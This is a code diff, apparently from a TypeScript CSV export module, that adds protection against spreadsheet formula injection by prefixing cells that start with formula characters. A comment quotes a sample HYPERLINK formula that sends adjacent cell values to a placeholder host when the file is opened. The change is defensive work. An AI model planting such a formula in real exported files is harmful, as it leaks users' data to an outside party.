@@ -142,8 +142,30 @@ export function csvToRawRows(cells: readonly string[][], fileName: string): CsvR
   return { raws, map, problems };
 }
 
+/** Excel and Sheets evaluate a cell whose text starts with one of these. */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+/** ...but a bare number is never a formula. See the note in `escapeField`. */
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/;
+
+/**
+ * RFC 4180 quoting, plus formula neutralisation.
+ *
+ * Quoting alone does not stop a formula: the CSV is parsed first, and the cell
+ * text is evaluated after. So a Note that rode in from someone else's workbook
+ * as `=HYPERLINK("https://x/?d="&A1&B1,"Open")` posts neighbouring cells the
+ * moment the export is opened. `note`, `category`, `account`, `paymentMethod`
+ * and every `extra` value AND ITS COLUMN NAME come straight from the input
+ * file, so all of them reach here untouched.
+ *
+ * The `PLAIN_NUMBER` exemption keeps the guard from mangling data that is
+ * merely numeric. `amount` is always >= 0 so it never trips the test, but an
+ * `extra` column the user added themselves — a balance, a delta, anything that
+ * can hold `-12.50` — round-trips through here, and quoting it as `'-12.50`
+ * would turn a number into text on every export.
+ */
 function escapeField(value: string, delimiter: Delimiter): string {
-  return /["\n]/.test(value) || value.includes(delimiter) ? `"${value.replace(/"/g, '""')}"` : value;
+  const safe = FORMULA_LEAD.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
+  return /["\n]/.test(safe) || safe.includes(delimiter) ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
 
 /**
